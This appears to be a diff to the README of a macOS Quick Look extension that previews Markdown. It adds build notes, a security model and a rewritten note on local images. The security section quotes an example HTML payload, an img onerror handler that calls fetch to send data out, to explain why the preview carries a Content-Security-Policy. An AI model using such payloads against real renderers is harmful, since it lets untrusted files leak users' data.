@@ -63,7 +63,30 @@ qlmanage -p path/to/file.md
 - `build.sh` compiles both targets directly with `swiftc` (the extension is
   linked with `-e _NSExtensionMain`, the entry-point override Xcode normally
   wires up invisibly for app extensions), assembles the `.app`/`.appex`
-  bundle structure by hand, and ad-hoc code signs both.
+  bundle structure by hand, and ad-hoc code signs both. Each target is built
+  for `arm64` and `x86_64` and `lipo`'d into a universal binary, against the
+  `macos11.0` deployment target that `LSMinimumSystemVersion` advertises —
+  without an explicit `-target`, `swiftc` builds for the *host* macOS and the
+  bundle silently refuses to load on anything older than the build machine.
+
+## Security model
+
+Previewed files are untrusted input: pressing Space in Finder is enough to
+run them through `marked`, which does **not** sanitize embedded raw HTML.
+Everything the preview needs is inlined by `MarkdownRenderer`, so no remote
+fetch is ever legitimate, and `Resources/template.html` carries a
+Content-Security-Policy that denies all of them (`default-src 'none'`, with
+`data:` images and inline script/style only). Without it, a `.md` file can:
+
+- silently fetch remote images, stylesheets and iframes (tracking pixels that
+  fire on preview, reporting when and where you previewed a file);
+- execute arbitrary JavaScript via handlers such as
+  `<img src=x onerror="fetch('https://…?d='+…)">`, since the extension holds
+  `com.apple.security.network.client`.
+
+`PreviewViewController` also refuses in-panel navigation — a clicked link
+opens in your browser instead of replacing the preview with a web page that
+has no way back — and suppresses JS-initiated windows, alerts and prompts.
 
 ## Troubleshooting
 
@@ -80,9 +103,28 @@ qlmanage -p path/to/file.md
 
 ## Known limitations
 
-- Local images referenced by relative path are inlined as base64 at preview
-  time; this only works if the extension's sandbox can read that file (same
-  folder as the `.md` file — should generally work).
+- **Local images do not render.** Relative image references are inlined as
+  base64 at preview time, but Quick Look's sandbox only grants the extension
+  read access to *the previewed file itself* — not to its siblings. Reading
+  `logo.png` next to `README.md` fails with "you don't have permission to
+  view it", so the image falls back to its alt text. `stat` succeeds and the
+  file is visibly present, which makes this look like a bug in the inlining
+  code; it isn't.
+
+  Granting the extension broader read access does fix it, at the cost of
+  weakening the sandbox — add to `Plists/Extension.entitlements`:
+
+  ```xml
+  <key>com.apple.security.temporary-exception.files.home-relative-path.read-only</key>
+  <array>
+      <string>/</string>
+  </array>
+  ```
+
+  That lets the extension read anything under `~`. Only consider it because
+  the preview can no longer talk to the network (see the CSP in
+  `Resources/template.html`) — without that Content-Security-Policy, a
+  hostile `.md` file could name any path on disk and beacon the contents out.
 - No Finder icon/thumbnail preview (only the spacebar Quick Look panel) —
   that would need a separate `QLThumbnailProvider` extension target.
 - Ad-hoc signed apps can occasionally need re-registering
